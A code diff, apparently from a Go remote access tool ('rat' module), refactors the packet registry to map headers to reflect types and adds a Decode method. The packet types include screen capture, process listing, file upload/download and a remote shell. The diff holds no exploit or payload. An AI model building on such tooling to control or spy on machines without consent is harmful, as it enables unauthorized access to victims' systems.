@@ -2,9 +2,10 @@ package main
 
 import (
 	"rat/shared/network/header"
+	"reflect"
 )
 
-type PacketMap map[header.PacketHeader]IncomingPacket
+type PacketMap map[header.PacketHeader]reflect.Type
 
 var packets PacketMap
 
@@ -15,24 +16,25 @@ type OutgoingPacket interface {
 
 type IncomingPacket interface {
 	OnReceive(c *Client) error
+	Decode(buf []byte) (IncomingPacket, error)
 }
 
 type Packet struct{}
 
 func init() {
 	packets = make(PacketMap)
-	packets[header.PingHeader] = Ping{}
-	packets[header.ComputerInfoHeader] = ComputerInfoPacket{}
-	packets[header.ScreenHeader] = ScreenPacket{}
-	packets[header.ProcessHeader] = ProcessPacket{}
-	packets[header.MonitorsHeader] = MonitorsPacket{}
-	packets[header.DirectoryHeader] = DirectoryPacket{}
-	packets[header.PutFileHeader] = UploadPacket{}
-	packets[header.GetFileHeader] = DownloadPacket{}
-	packets[header.ShellHeader] = ShellPacket{}
-	packets[header.WindowsHeader] = WindowsPacket{}
+	packets[header.PingHeader] = reflect.TypeOf(Ping{})
+	packets[header.ComputerInfoHeader] = reflect.TypeOf(ComputerInfoPacket{})
+	packets[header.ScreenHeader] = reflect.TypeOf(ScreenPacket{})
+	packets[header.ProcessHeader] = reflect.TypeOf(ProcessPacket{})
+	packets[header.DirectoryHeader] = reflect.TypeOf(DirectoryPacket{})
+	packets[header.UploadToClientHeader] = reflect.TypeOf(UploadPacket{})
+	packets[header.DownloadToServerHeader] = reflect.TypeOf(DownloadPacket{})
+	packets[header.ShellHeader] = reflect.TypeOf(ShellPacket{})
+	packets[header.WindowsHeader] = reflect.TypeOf(WindowsPacket{})
 }
 
 func GetIncomingPacket(header header.PacketHeader) IncomingPacket {
-	return packets[header]
+	val := packets[header]
+	return reflect.New(val).Elem().Interface().(IncomingPacket)
 }
